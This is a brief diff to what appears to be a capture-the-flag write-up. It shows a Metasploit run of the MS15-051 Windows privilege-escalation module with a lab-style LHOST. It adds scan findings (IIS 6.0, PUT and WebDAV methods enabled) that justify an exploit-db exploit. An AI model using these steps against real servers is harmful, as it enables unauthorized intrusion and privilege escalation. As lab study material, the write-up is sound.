@@ -48,3 +48,8 @@ LHOST => 10.10.14.11
 
 msf exploit(windows/local/ms15_051_client_copy_image) > run
 ```
+#### WHY
++ Server: Microsoft-IIS/6.0
++ OSVDB-397: HTTP method ('Public' Header): 'PUT' method could allow clients to save files on the web server.
++ OPTIONS WebDAV enabled (COPY UNLOCK PROPFIND PROPPATCH LOCK MKCOL SEARCH listed as allowed)
+https://www.exploit-db.com/exploits/41738
